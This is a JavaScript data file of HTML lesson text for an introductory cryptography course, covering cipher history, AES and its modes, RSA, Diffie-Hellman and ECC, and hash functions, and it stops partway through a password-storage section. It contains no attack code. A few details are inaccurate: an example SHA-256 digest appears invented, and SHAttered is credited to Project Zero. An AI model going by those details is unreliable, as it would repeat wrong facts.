/* Study content for each course module, keyed by module ID */
const COURSE_CONTENT = {
  // ── Course 1: Introduction to Cryptography ────────────────────────────
  1: `
<p>Cryptography is the science of protecting information by transforming it into an unreadable form using mathematical algorithms. Only someone holding the correct <strong>key</strong> can reverse the transformation and read the original data. The word comes from the Greek <em>kryptós</em> (hidden) and <em>gráphein</em> (to write). It is one of the oldest disciplines in human history — and today it underpins every secure digital system on the planet, from WhatsApp messages to online banking to national security infrastructure.</p>
<p>Without cryptography, every password you type, every card payment you make, and every private message you send would be visible to anyone on the same network. Understanding cryptography is not just for security specialists — every developer who builds anything that handles user data needs to understand its fundamentals.</p>

<h5 class="content-heading">A Brief History — 3,000 Years of Secret Messages</h5>
<p>Humans have been hiding messages for millennia. Around 1900 BC, Egyptian scribes used non-standard hieroglyphs in inscriptions — the earliest known example of deliberate obfuscation. The <strong>Caesar cipher</strong> (used by Julius Caesar around 50 BC) shifted each letter of the alphabet by a fixed number — rotating "HELLO" by 3 gives "KHOOR". The Spartans used a <strong>scytale</strong> — a rod around which a strip of leather was wound — so the message only made sense when wrapped around a rod of the same diameter. Clever for their time, but both are broken in seconds today by <strong>frequency analysis</strong>: in English, 'E' appears ~13% of the time. Count which ciphertext character is most frequent, and you have found 'E'. From there the rest unravels quickly.</p>
<p>The 20th century brought mechanical cryptography. The German <strong>Enigma machine</strong> used rotating electromechanical rotors to produce a polyalphabetic substitution that changed with every keypress — meaning the same letter would encrypt differently each time it appeared. For years it seemed unbreakable. But Enigma had a fatal flaw: no letter could ever encrypt to itself. Combined with known message structures ("Heil Hitler" often at the end of messages), Alan Turing and the team at Bletchley Park exploited this to crack it. The lesson: no matter how complex the machine, a flawed design can always be broken by a clever mathematician.</p>
<p>The 1970s marked the modern era. NIST published <strong>DES (Data Encryption Standard)</strong> in 1977 — the first widely standardised cipher. More importantly, in 1976 Whitfield Diffie and Martin Hellman published their landmark paper on <strong>public-key cryptography</strong>, solving the fundamental key distribution problem that had plagued cryptographers for centuries: how do two strangers agree on a shared secret over a public channel without ever meeting? Today we use AES, RSA, ECC, and SHA-256 — algorithms that have been publicly scrutinised by thousands of researchers for decades and withstood every known attack.</p>

<h5 class="content-heading">The CIA Triad — Three Goals Every System Must Meet</h5>
<p><strong>Confidentiality</strong> means only authorised parties can read the data. Encryption transforms <strong>plaintext</strong> into <strong>ciphertext</strong> that is meaningless to anyone without the key. Real-world example: your WhatsApp messages are end-to-end encrypted using the Signal Protocol. Not even WhatsApp's own servers can read them — only your device and your recipient's device hold the keys. An attacker on the same Wi-Fi network intercepting your packets sees only random-looking bytes.</p>
<p><strong>Integrity</strong> means the data has not been altered in transit or storage. Cryptographic <strong>hash functions</strong> and <strong>Message Authentication Codes (MACs)</strong> detect any tampering. When you download software, the developer publishes a SHA-256 hash of the installer. You compute the hash of your downloaded file — if the hashes match, the file is byte-for-byte identical to what the developer published. Even a single changed byte produces a completely different hash (the avalanche effect).</p>
<p><strong>Authentication</strong> means you can verify the identity of who you are communicating with. Without it, encryption is useless — you might be encrypting messages perfectly securely to an attacker who is impersonating your bank. Digital certificates and signatures solve this: when your browser connects to your bank over HTTPS, the server presents a certificate signed by a trusted Certificate Authority (CA) proving it really is your bank.</p>
<p>Many security frameworks add a fourth property: <strong>Non-repudiation</strong> — the sender cannot later deny having sent a message. Because only the sender holds their private key, a valid digital signature is undeniable proof of authorship. This is legally binding in many jurisdictions and essential for contracts, financial authorisations, and audit trails.</p>

<h5 class="content-heading">Kerckhoffs's Principle — The Golden Rule of Cryptography</h5>
<p>In 1883, Auguste Kerckhoffs stated: <em>"A cryptosystem should be secure even if everything about the system, except the key, is public knowledge."</em> This single principle shapes everything in modern cryptography. We do NOT rely on keeping the algorithm secret — so-called "security through obscurity" inevitably fails because algorithms get leaked, reverse-engineered, or independently discovered. Security must rest entirely on the secrecy of the key alone.</p>
<p>This is why AES, RSA, SHA-256, and every other modern algorithm are completely public, open standards that anyone can read, implement, and attack. Their security has been battle-tested by the world's best cryptographers over decades. A proprietary secret algorithm that has never been publicly analysed provides far weaker security — you are trusting its designers found no flaws, rather than trusting that millions of researchers worldwide have found none.</p>
<p>The practical implication: protect your keys obsessively. Rotate them regularly. Store them in hardware security modules (HSMs) or secrets managers. Never hardcode them in source code. The algorithm being public is fine — a compromised key is catastrophic.</p>

<h5 class="content-heading">Three Families of Cryptographic Primitives</h5>
<p><strong>Symmetric cryptography</strong> uses one shared secret key for both encrypting and decrypting. It is extremely fast — AES can encrypt gigabytes per second on modern hardware with hardware acceleration. The problem: key distribution. How do two parties share the secret key without an attacker intercepting it? This requires a secure channel to already exist, which is circular. Symmetric crypto is the workhorse for encrypting bulk data, but cannot stand alone.</p>
<p><strong>Asymmetric cryptography</strong> (public-key cryptography) solves the distribution problem elegantly. Each party has a key pair: a public key (shared freely with everyone) and a private key (kept secret). What one key encrypts, only the other can decrypt. Two strangers who have never met can establish a shared secret over a completely public channel — this is the magic of <strong>Diffie-Hellman key exchange</strong>. The trade-off: asymmetric operations are 100–1000× slower than symmetric ones. In practice, asymmetric crypto is used only to exchange a symmetric session key; all bulk data is then encrypted symmetrically.</p>
<p><strong>Hash functions</strong> are one-way transformations. You can compute <code>hash(data)</code> efficiently, but given the hash alone you cannot recover the original data. They produce a fixed-size fingerprint of any-size input. Used for: verifying file integrity (SHA-256 checksums), storing passwords securely (bcrypt, Argon2), building digital signatures (sign the hash, not the whole message), and constructing MACs (HMAC).</p>

<h5 class="content-heading">Why Classical Ciphers All Fail</h5>
<p>Every classical cipher — Caesar, Vigenère, Playfair, substitution ciphers — fails because they do not achieve two fundamental security properties that Shannon proved all strong ciphers must have:</p>
<p><strong>Confusion</strong> — the relationship between the key and the ciphertext must be as complex as possible. Changing one bit of the key should affect many bits of the ciphertext in an unpredictable way. A Caesar cipher has no confusion: the key is just one number (the shift) and its effect on the ciphertext is completely predictable.</p>
<p><strong>Diffusion</strong> — each bit of the plaintext should influence many bits of the ciphertext. Ideally, changing one plaintext bit flips roughly half of all ciphertext bits (the <strong>avalanche effect</strong>). A Caesar cipher has no diffusion: changing one letter only affects that one letter in the ciphertext. AES achieves full diffusion within two rounds — changing one byte of the plaintext eventually affects every byte of the output.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Plaintext:</strong> The original, readable data before any encryption is applied — a message, file, or any information you want to protect.</li>
<li><strong>Ciphertext:</strong> The scrambled, unreadable output after encryption — should appear statistically random to anyone without the key.</li>
<li><strong>Key:</strong> A secret value (essentially a large random number) that controls the algorithm's behaviour — the entire security of a cryptosystem rests on keeping this secret.</li>
<li><strong>Encryption:</strong> The mathematical process of transforming plaintext into ciphertext using a key — the forward direction of the cipher.</li>
<li><strong>Decryption:</strong> The reverse process — recovering plaintext from ciphertext using the correct key. Without the key, this should be computationally infeasible.</li>
<li><strong>Caesar cipher:</strong> A substitution cipher that shifts each letter by a fixed amount — historically significant but trivially broken by trying all 25 possible shifts.</li>
<li><strong>Enigma machine:</strong> A WWII electromechanical cipher device cracked by Turing at Bletchley Park — demonstrates that complexity alone does not equal security.</li>
<li><strong>Kerckhoffs's Principle:</strong> Security must rest on the key alone, not on keeping the algorithm secret — the basis of all modern cryptographic design.</li>
<li><strong>CIA Triad:</strong> Confidentiality, Integrity, and Authentication — the three core properties every secure system must provide.</li>
<li><strong>Non-repudiation:</strong> The property that prevents a sender from denying they sent a message — achieved through digital signatures.</li>
<li><strong>Confusion:</strong> A cipher property ensuring each ciphertext bit depends on many key bits in a complex, unpredictable way — prevents key deduction from ciphertext analysis.</li>
<li><strong>Diffusion:</strong> A cipher property ensuring each plaintext bit influences many ciphertext bits — the avalanche effect that defeats statistical attacks.</li>
<li><strong>Frequency analysis:</strong> Cryptanalysis technique exploiting statistical letter distributions in natural language to break substitution ciphers — completely defeated by modern ciphers.</li>
</ul>`,

  2: `
<p>Symmetric encryption uses a single shared secret key for both encrypting and decrypting data. It is orders of magnitude faster than asymmetric encryption and is the workhorse for encrypting bulk data — files, database records, network traffic, and disk volumes. Every HTTPS connection you make uses symmetric encryption for the actual data transfer. The fundamental challenge is <strong>key distribution</strong>: both parties need the same secret key, but how do they agree on it without an attacker intercepting it? (Asymmetric cryptography solves this — covered in Module 3.)</p>
<p>Understanding symmetric encryption is not just academic — every time you store a password in a database, encrypt a file, or secure a network connection, you are choosing between these algorithms and modes. Choosing the wrong one is one of the most common and costly developer mistakes in security.</p>

<h5 class="content-heading">The Fall of DES — A Cautionary Tale About Key Length</h5>
<p>The <strong>Data Encryption Standard (DES)</strong>, published by NIST in 1977, was the first widely standardised symmetric cipher. It operates on 64-bit blocks with a 56-bit key — 2⁵⁶ possible keys, which sounds like a lot. But by 1998 the EFF built "Deep Crack" for $250,000 — a machine that tried every possible key in 56 hours. By 1999 it cracked DES in under 22 hours. The lesson: 56-bit keys are trivially brute-forceable with dedicated hardware. Key length matters enormously.</p>
<p><strong>Triple-DES (3DES)</strong> was a stopgap — it applies DES three times with different keys, giving approximately 112-bit effective security. But 3DES is slow (three full DES passes per block) and is now formally deprecated by NIST. If you encounter DES or 3DES in existing code, replace it with AES immediately — these ciphers are forbidden in all new systems.</p>

<h5 class="content-heading">AES — The Algorithm That Secures the Modern World</h5>
<p>In 1997, NIST ran an open public competition to replace DES. After five years of global cryptanalysis by the world's best researchers, the Rijndael algorithm (designed by Belgian cryptographers Joan Daemen and Vincent Rijmen) was selected as <strong>AES (Advanced Encryption Standard)</strong> in 2001. AES operates on 128-bit blocks with three key size options: 128-bit (10 rounds), 192-bit (12 rounds), and 256-bit (14 rounds). AES-256 is used by the US government to protect TOP SECRET information.</p>
<p>AES is not a black box — it is a beautifully transparent algorithm. Each round transforms a 4×4 grid of bytes (the "state matrix") through four operations that together achieve strong confusion and diffusion:</p>
<ul class="content-list">
<li><strong>SubBytes:</strong> Each of the 16 bytes is replaced with a value from a fixed S-box (substitution lookup table) — provides non-linearity and confusion, making the relationship between key and ciphertext complex.</li>
<li><strong>ShiftRows:</strong> Each row of the 4×4 matrix is cyclically shifted left by 0, 1, 2, and 3 positions — ensures bytes from different columns mix together in subsequent steps.</li>
<li><strong>MixColumns:</strong> Each column is multiplied by a fixed polynomial in a Galois Field (GF(2⁸)) — the main diffusion step, ensuring each output byte depends on all four input bytes of the column.</li>
<li><strong>AddRoundKey:</strong> Each byte is XOR-ed with the corresponding byte of the round key, derived from the original key via a key schedule — this is where the secret key enters the computation.</li>
</ul>
<p>After just two rounds of AES, every output bit depends on every input bit and every key bit. After 14 rounds (AES-256), the relationship is so complex that the best known attack against AES-128 reduces security by less than 2 bits — you would still need to try 2¹²⁶ operations. For practical purposes, AES is unbreakable when used correctly.</p>

<h5 class="content-heading">Block Ciphers vs Stream Ciphers</h5>
<p>A <strong>block cipher</strong> like AES encrypts data in fixed-size chunks — one 128-bit (16-byte) block at a time. For messages longer than 16 bytes (which is almost always), you need a <strong>mode of operation</strong> that defines how multiple blocks are chained together. The choice of mode is where most real-world encryption mistakes happen.</p>
<p>A <strong>stream cipher</strong> generates a pseudorandom keystream and XORs it with the plaintext byte by byte. This is conceptually simpler and faster in constrained environments. <strong>ChaCha20</strong> is the dominant modern stream cipher, used in TLS 1.3 on devices without AES hardware acceleration. The critical rule for all stream ciphers: <em>never reuse the same key + nonce combination</em>. If you encrypt two messages with the same keystream, XORing their ciphertexts cancels the keystream — leaving the XOR of the two plaintexts, which is completely breakable with frequency analysis.</p>

<h5 class="content-heading">Modes of Operation — Where Most Mistakes Happen</h5>
<p><strong>ECB (Electronic Codebook)</strong> — The simplest mode and the most dangerous. Each 16-byte block is encrypted independently with the same key. The catastrophic consequence: identical plaintext blocks produce identical ciphertext blocks. The famous "ECB Penguin" image — a bitmap of a penguin encrypted with ECB — shows the original silhouette perfectly preserved in the ciphertext because all the white-pixel blocks encrypt to the same value. ECB reveals patterns in data even without breaking the cipher. Never use ECB. There is no legitimate security use case for it.</p>
<p><strong>CBC (Cipher Block Chaining)</strong> — Each plaintext block is XOR-ed with the previous ciphertext block before encryption, breaking the pattern problem of ECB. Requires a random <strong>IV (Initialisation Vector)</strong> for the first block. Better than ECB, but CBC has serious problems: it is sequential (you cannot parallelise encryption), it requires PKCS#7 padding for messages not a multiple of 16 bytes, and padding oracle attacks (POODLE in 2014, BEAST in 2011) have exploited subtle implementation flaws to decrypt CBC-encrypted HTTPS cookies. CBC is considered legacy — avoid it for new systems.</p>
<p><strong>CTR (Counter Mode)</strong> — Encrypts an incrementing counter value to generate a keystream, then XORs it with plaintext. This turns AES into a stream cipher. CTR is fully parallelisable (great for performance), requires no padding, and random-access decryption is possible. But: CTR provides no authentication — an attacker who can modify ciphertext can predictably flip corresponding plaintext bits, enabling bit-flipping attacks.</p>
<p><strong>GCM (Galois/Counter Mode)</strong> — The recommended choice for virtually all new symmetric encryption. GCM combines CTR mode encryption with a Galois field <strong>authentication tag (GHASH)</strong> — this is an <strong>AEAD (Authenticated Encryption with Associated Data)</strong> scheme. In one pass, you get: encryption (confidentiality) and a 128-bit integrity tag (authentication). Any modification to the ciphertext, the IV, or any associated data will cause tag verification to fail. GCM is hardware-accelerated on modern CPUs (AES-NI instruction sets), parallelisable, and is the mandatory cipher mode in TLS 1.3. Critical rule: each (key, nonce) pair must be used for exactly one message — reusing a GCM nonce with the same key completely destroys both confidentiality and the authentication tag.</p>
<p><strong>ChaCha20-Poly1305</strong> — An alternative AEAD scheme designed by Daniel Bernstein. ChaCha20 (stream cipher) handles encryption; Poly1305 (MAC) handles authentication. It is designed to be fast in pure software — important for mobile and IoT devices without hardware AES acceleration. TLS 1.3 mandates it as an alternative to AES-GCM, and WireGuard VPN uses it exclusively.</p>

<h5 class="content-heading">IVs, Nonces, and Why Random Generation Matters</h5>
<p>An <strong>IV (Initialisation Vector)</strong> — also called a <strong>nonce (number used once)</strong> in stream cipher and AEAD contexts — is a random value that must be unique for each encryption operation using the same key. The IV does not need to be secret; it is transmitted alongside the ciphertext. Its only job is to ensure that encrypting the same plaintext twice with the same key produces different ciphertexts, preventing pattern analysis.</p>
<p>The IV must be generated by a <strong>CSPRNG (Cryptographically Secure Pseudo-Random Number Generator)</strong> — not a regular random number generator, not a timestamp, not a sequential counter (in GCM). In Node.js use <code>crypto.randomBytes(12)</code> for a 96-bit GCM nonce. In Python use <code>os.urandom(12)</code>. Regular Math.random() or random.random() are not cryptographically secure — they can be predicted from a small number of observed outputs.</p>

<h5 class="content-heading">How Secure is Secure Enough?</h5>
<p>Security is measured in bits — the work factor an attacker needs to break the system. AES-128 requires 2¹²⁸ operations to brute-force — more than the number of atoms in the observable universe. AES-256 requires 2²⁵⁶. Even if we could harness every atom in the universe as a computing element running since the Big Bang, we could not trial-divide AES-128. For practical purposes, the algorithm itself is not the weak point — key management, implementation bugs, and side-channel attacks are where real-world systems fail.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Symmetric encryption:</strong> One shared secret key for both encryption and decryption — extremely fast, used for all bulk data encryption.</li>
<li><strong>DES:</strong> The first standardised cipher (1977) — 56-bit key, brute-forceable in hours. Forbidden in modern systems.</li>
<li><strong>AES:</strong> The global standard since 2001. 128-bit blocks, 128/192/256-bit keys. AES-256-GCM is the recommended choice for new systems.</li>
<li><strong>Block cipher:</strong> Encrypts fixed-size blocks (AES: 16 bytes). Requires a mode of operation for longer messages.</li>
<li><strong>Stream cipher:</strong> Generates a keystream XOR-ed byte-by-byte with plaintext. Fast in software; never reuse the nonce.</li>
<li><strong>ECB mode:</strong> Encrypts blocks independently — identical blocks produce identical output. Never use; it leaks data patterns catastrophically.</li>
<li><strong>CBC mode:</strong> Chains blocks with XOR — better than ECB but legacy. Vulnerable to padding oracle attacks; requires careful padding handling.</li>
<li><strong>GCM mode:</strong> AEAD — encryption plus authentication in one pass. The recommended mode for new systems. Used in TLS 1.3.</li>
<li><strong>ChaCha20-Poly1305:</strong> Alternative AEAD stream cipher — fast in software; used in TLS 1.3 and WireGuard on devices without AES hardware acceleration.</li>
<li><strong>IV / Nonce:</strong> Random value unique per encryption with the same key — prevents pattern leakage. Must be generated by a CSPRNG.</li>
<li><strong>AEAD:</strong> Authenticated Encryption with Associated Data — provides both confidentiality and integrity in a single cryptographic primitive.</li>
<li><strong>CSPRNG:</strong> Cryptographically Secure Pseudo-Random Number Generator — required for keys, IVs, and nonces. Never use Math.random() for security.</li>
<li><strong>PKCS#7 padding:</strong> Scheme that pads the final CBC block to 16 bytes. A source of real-world vulnerabilities when not validated in constant time.</li>
</ul>`,

  3: `
<p>Symmetric encryption is fast and powerful, but it has one unsolvable problem: both parties need the same secret key before they can communicate. If you send it over the internet unprotected, an attacker intercepts it. If you meet in person to exchange keys, that does not scale to billions of internet users connecting to millions of servers. This is the <strong>key distribution problem</strong> — and asymmetric cryptography solves it so elegantly that it underpins every secure connection on the internet.</p>
<p>Every time you see a padlock in your browser, asymmetric cryptography has already quietly run in the background to establish a secure channel. Understanding how it works gives you insight into the foundation of all modern internet security.</p>

<h5 class="content-heading">Public-Key Cryptography — The Core Idea</h5>
<p>In 1976, Whitfield Diffie and Martin Hellman proposed a revolutionary concept: what if each party had two mathematically linked keys — a <strong>public key</strong> they share openly with the world, and a <strong>private key</strong> they keep completely secret? The mathematical relationship between the keys must have a crucial property: it must be easy to compute in one direction, but computationally infeasible to reverse. This is called a <strong>trapdoor one-way function</strong>.</p>
<p>The result: anyone can encrypt a message using your public key, but only you — with the corresponding private key — can decrypt it. You can post your public key on your website. No secret channel is needed to share it.</p>

<h5 class="content-heading">RSA — Rivest–Shamir–Adleman</h5>
<p>RSA, published in 1977 by Ron Rivest, Adi Shamir, and Leonard Adleman, is based on the mathematical hardness of <strong>integer factorisation</strong>: multiplying two large prime numbers together is trivial, but given only the product (a very large number), finding those two prime factors is computationally infeasible for large enough numbers.</p>
<p><strong>RSA key generation (simplified):</strong></p>
<ul class="content-list">
<li>Choose two large, random prime numbers <code>p</code> and <code>q</code> (each 1024+ bits for RSA-2048).</li>
<li>Compute the modulus: <code>n = p × q</code>. This is public.</li>
<li>Compute Euler's totient: <code>φ(n) = (p−1)(q−1)</code>. This stays secret.</li>
<li>Choose a public exponent <code>e</code> (commonly 65537) such that <code>gcd(e, φ(n)) = 1</code>.</li>
<li>Compute the private exponent <code>d</code> such that <code>e × d ≡ 1 (mod φ(n))</code>. This is the private key.</li>
<li><strong>Public key:</strong> (n, e). <strong>Private key:</strong> (n, d). Discard p, q, φ(n) after key generation.</li>
</ul>
<p><strong>Encryption:</strong> C = Mᵉ mod n. <strong>Decryption:</strong> M = Cᵈ mod n. The mathematics works because of Euler's theorem, and the security relies entirely on the difficulty of factoring n back into p and q. For RSA-2048, no known algorithm can factor n in feasible time with classical computers.</p>
<p><strong>OAEP padding is mandatory.</strong> Raw RSA (textbook RSA without padding) is deterministic and malleable — the same plaintext always produces the same ciphertext, and an attacker can manipulate ciphertexts in predictable ways. <strong>OAEP (Optimal Asymmetric Encryption Padding)</strong> adds randomness and structure before encryption, making ciphertexts non-deterministic and defeating chosen-ciphertext attacks. Always use RSA-OAEP, never raw RSA.</p>

<h5 class="content-heading">Diffie-Hellman Key Exchange</h5>
<p>Diffie-Hellman (DH) does not encrypt data directly — it solves a narrower problem: how can two parties establish a shared secret over a public channel, without ever transmitting that secret? They use the mathematical hardness of the <strong>discrete logarithm problem</strong>.</p>
<p>Simplified analogy: Alice and Bob agree on a public paint colour (the modulus p and generator g). Alice mixes in her secret colour and sends the result to Bob. Bob mixes in his secret colour and sends the result to Alice. Both now mix in the other's result — and both arrive at the same combined colour. An eavesdropper sees the intermediate mixes but cannot reverse-engineer the secret colours without solving the discrete log problem.</p>
<p><strong>Ephemeral Diffie-Hellman (DHE)</strong> generates a fresh key pair for every session — this provides <strong>Perfect Forward Secrecy (PFS)</strong>. If an attacker records encrypted traffic today and later compromises the server's long-term private key, they still cannot decrypt past sessions because those session keys were ephemeral and are now gone forever.</p>

<h5 class="content-heading">Elliptic Curve Cryptography (ECC)</h5>
<p>ECC achieves the same security as RSA but with dramatically smaller key sizes, making it faster and more efficient — critical for mobile devices, IoT, and high-traffic servers. ECC is based on the <strong>elliptic curve discrete logarithm problem (ECDLP)</strong>: given a point P on a specific elliptic curve, and the result Q = k×P of multiplying P by a secret scalar k, finding k is computationally infeasible.</p>
<p>An elliptic curve is defined by the equation y² = x³ + ax + b over a finite field. Points on the curve have a geometric addition operation: draw a line through two points, find where it intersects the curve, and reflect over the x-axis — that intersection is the "sum". Repeated application of this operation (scalar multiplication) is easy to compute but impossible to reverse efficiently.</p>
<p>Security comparison: RSA-2048 provides ~112-bit security. To get equivalent security with ECC you only need a 224-bit key. ECC-256 (like Curve25519 or P-256) provides ~128-bit security and is used in TLS 1.3, Signal, Bitcoin, and almost all modern systems.</p>
<p>Common curves: <strong>P-256 (NIST)</strong> — widely deployed, standard choice; <strong>Curve25519</strong> — designed by Daniel Bernstein, faster and harder to implement incorrectly, used in TLS 1.3 and Signal; <strong>secp256k1</strong> — used in Bitcoin.</p>

<h5 class="content-heading">ECDH — Elliptic Curve Diffie-Hellman</h5>
<p>ECDH applies Diffie-Hellman key exchange using elliptic curve arithmetic. Each party generates an ECC key pair. They exchange public keys. Each computes (their private key × other party's public key) — both arrive at the same shared secret point on the curve. This shared point's x-coordinate becomes the basis for a symmetric session key. ECDHE (Ephemeral ECDH) generates a fresh key pair per session for PFS.</p>

<h5 class="content-heading">Hybrid Encryption — How Real Systems Work</h5>
<p>Asymmetric cryptography is ~1000× slower than symmetric cryptography. Real-world systems use a <strong>hybrid approach</strong>: use asymmetric cryptography (RSA-OAEP or ECDH) to securely establish a shared symmetric key, then use that symmetric key (AES-256-GCM) to encrypt the actual data. TLS does exactly this: the handshake uses ECDHE to establish a session key, then AES-GCM encrypts the data stream. You get the key distribution benefits of asymmetric crypto and the speed benefits of symmetric crypto.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Key distribution problem:</strong> How to securely share a symmetric key over an insecure channel — solved by asymmetric cryptography.</li>
<li><strong>Public key:</strong> Freely shareable — used to encrypt messages sent to you, or to verify your signature.</li>
<li><strong>Private key:</strong> Never shared — used to decrypt messages, or to create a digital signature.</li>
<li><strong>Trapdoor one-way function:</strong> Easy to compute in one direction, computationally infeasible to reverse without the trapdoor (private key).</li>
<li><strong>RSA:</strong> Security based on integer factorisation. Key sizes: 2048-bit minimum, 4096-bit recommended for long-term use.</li>
<li><strong>OAEP padding:</strong> Mandatory padding scheme for RSA encryption — adds randomness and prevents malleable attacks.</li>
<li><strong>Diffie-Hellman (DH):</strong> Key agreement protocol using the discrete logarithm problem — lets two parties derive a shared secret without transmitting it.</li>
<li><strong>DHE / ECDHE:</strong> Ephemeral Diffie-Hellman — fresh keys per session, providing Perfect Forward Secrecy.</li>
<li><strong>ECC (Elliptic Curve Cryptography):</strong> Security based on the ECDLP — same security as RSA with much smaller keys.</li>
<li><strong>Curve25519:</strong> A modern, high-performance elliptic curve — fast, secure, and resistant to implementation errors.</li>
<li><strong>Perfect Forward Secrecy (PFS):</strong> Property ensuring past session keys cannot be recovered even if the long-term private key is later compromised.</li>
<li><strong>Hybrid encryption:</strong> Asymmetric crypto establishes a key; symmetric crypto encrypts the data — used in TLS, PGP, and all practical systems.</li>
<li><strong>RSA-2048 vs ECC-256:</strong> Both provide ~112–128 bit security. ECC-256 keys are 8× smaller and 10-40× faster for the same security level.</li>
</ul>

<h5 class="content-heading">How a Real HTTPS Connection is Established</h5>
<p>When your browser connects to https://bank.com, here is exactly what happens using asymmetric cryptography:</p>
<p><strong>Step 1 — ClientHello:</strong> Your browser sends a list of supported cipher suites, including ones like <code>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384</code>. This tells the server what algorithms the browser knows.</p>
<p><strong>Step 2 — ServerHello + Certificate:</strong> The server picks the best cipher suite, sends its X.509 certificate (containing its public key), and generates its own ECDHE ephemeral key pair, sending its public component.</p>
<p><strong>Step 3 — Authentication:</strong> Your browser checks: Is the certificate signed by a trusted CA? Is it valid today? Does the domain name match? If any check fails, you see a red warning.</p>
<p><strong>Step 4 — Key Exchange:</strong> Your browser generates its own ECDHE ephemeral key pair. Both sides now independently compute the same shared secret using ECDH math — without ever transmitting that secret.</p>
<p><strong>Step 5 — Symmetric keys derived:</strong> Both sides derive identical AES-256-GCM session keys from the shared secret. From this point, all data is encrypted symmetrically. The asymmetric operations are done — they existed only to securely establish the symmetric key.</p>
<p>The entire handshake takes roughly one round trip (TLS 1.3) and typically completes in under 100ms. This is the real-world performance of applied asymmetric cryptography at scale.</p>

<h5 class="content-heading">Common Implementation Mistakes to Avoid</h5>
<p>Asymmetric cryptography is frequently misused even by experienced developers. The most common mistakes: (1) Using RSA to directly encrypt large data — RSA can only encrypt data smaller than its key size; use hybrid encryption. (2) Using raw RSA without OAEP padding — textbook RSA is deterministic and malleable. (3) RSA-1024 bit keys — factored by well-funded attackers, use 2048 minimum. (4) Forgetting to validate certificates in code — many early TLS libraries defaulted to no certificate verification, making HTTPS equivalent to unencrypted HTTP. Always verify the full certificate chain. (5) Reusing ECDSA nonces — like Sony's PS3 mistake, this directly exposes the private key.</p>`,

  4: `
<p>A <strong>cryptographic hash function</strong> takes an input of any size — a single byte or a terabyte file — and produces a fixed-size output called a <strong>digest</strong> or <strong>hash</strong>. The function is deterministic (same input always gives the same output), one-way (you cannot reverse it), and produces dramatically different output for even the tiniest change in input (the avalanche effect). Hash functions appear in almost every part of modern computing security: digital signatures, password storage, file integrity checks, blockchains, data structures, and version control.</p>
<p>Understanding hash functions is essential because they are one of the most misused primitives in software development. Using the wrong hash function, or using a correct one incorrectly (e.g., SHA-256 for password storage), creates critical vulnerabilities while appearing secure on the surface.</p>

<h5 class="content-heading">The Three Security Properties of a Hash Function</h5>
<p><strong>1. Pre-image resistance (one-way):</strong> Given a hash value H, it must be computationally infeasible to find any input M such that hash(M) = H. If this fails, you can forge messages that hash to any desired value.</p>
<p><strong>2. Second pre-image resistance:</strong> Given an input M1 and its hash H, it must be infeasible to find a different input M2 (≠ M1) such that hash(M2) = H. If this fails, an attacker can substitute a fake document that hashes to the same value as a real one.</p>
<p><strong>3. Collision resistance:</strong> It must be computationally infeasible to find any two distinct inputs M1 and M2 where hash(M1) = hash(M2). This is the strongest property (and hardest to achieve) — finding any collision, not just one that targets a specific hash. A broken hash function like MD5 has collisions that can be found in seconds.</p>

<h5 class="content-heading">The Avalanche Effect</h5>
<p>A critical property of good hash functions is the <strong>avalanche effect</strong>: flipping a single bit of the input causes roughly 50% of the output bits to change — completely scrambling the output. Compare:</p>
<ul class="content-list">
<li>SHA-256("hello") = <code>2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824</code></li>
<li>SHA-256("hellp") = <code>e81a70a1db2c98e234beabce2a82b5e0b0e2dbef15e68d06c0a6e1b74db16b7e</code></li>
</ul>
<p>One character change, completely different output. This makes it impossible to deduce anything about the input from the output.</p>

<h5 class="content-heading">Common Hash Algorithms — Which Are Safe?</h5>
<p><strong>MD5 (1992) — BROKEN. Do not use for security.</strong> Produces a 128-bit hash. Full collision attacks are practical in seconds on modern hardware. Researchers have created two different executable files with the same MD5 hash. MD5 should only be used as a non-cryptographic checksum (detecting accidental corruption, not malicious tampering). Using MD5 for password storage or digital signatures is a critical vulnerability.</p>
<p><strong>SHA-1 (1995) — BROKEN. Do not use for security.</strong> Produces a 160-bit hash. In 2017, Google's Project Zero produced the first practical SHA-1 collision (the "SHAttered" attack) — two different PDF files with identical SHA-1 hashes. Major browsers and certificate authorities stopped accepting SHA-1 certificates.</p>
<p><strong>SHA-256 (part of SHA-2 family, 2001) — SECURE. Recommended.</strong> Produces a 256-bit hash. Part of the SHA-2 family (SHA-224, SHA-256, SHA-384, SHA-512). No practical attack is known. Used in Bitcoin, TLS certificates, code signing, HMAC, and countless other applications. SHA-384 and SHA-512 offer larger output sizes for applications requiring longer-term security.</p>
<p><strong>SHA-3 (Keccak, standardised 2015) — SECURE. Alternative to SHA-2.</strong> SHA-3 uses a completely different internal construction (sponge construction) than SHA-2 (Merkle-Damgård construction). This diversity matters: if a fundamental weakness were found in the Merkle-Damgård design, SHA-3 would remain unaffected. SHA-3 is recommended for new designs and as a backup to SHA-2.</p>
<p><strong>BLAKE2 / BLAKE3</strong> — Not NIST standards, but fast and secure alternatives. BLAKE3 is the fastest cryptographic hash function available, often 3-10× faster than SHA-256, suitable for applications where hashing speed is critical (large files, databases).</p>

<h5 class="content-heading">HMAC — Message Authentication Codes</h5>
<p>A bare hash verifies data integrity but not authenticity — anyone can compute a hash. An <strong>HMAC (Hash-based Message Authentication Code)</strong> requires a secret key. HMAC-SHA256(key, message) produces a tag that only someone with the key can verify or produce. It is constructed as:</p>
<p><code>HMAC(K, M) = H((K ⊕ opad) || H((K ⊕ ipad) || M))</code></p>
<p>where opad and ipad are fixed padding constants. HMAC provides both integrity (data not altered) and authentication (came from someone with the key). HMAC is used in JWTs (signing the token), TLS record MAC, API request signing (AWS Signature v4), and OAuth.</p>

<h5 class="content-heading">Password Storage — Why SHA-256 Alone Is Wrong</h5>
<p>Storing passwords as raw SHA-256 hashes is dangerously insufficient. An attacker who steals your hash database can precompute billions of SHA-256 hashes from common passwords (a <strong>rainbow table</strong>) and look them up instantly. SHA-256 is designed to be fast — a modern GPU can compute 10 billion SHA-256 hashes per second. You must use a password hashing function designed to be slow and memory-hard.</p>
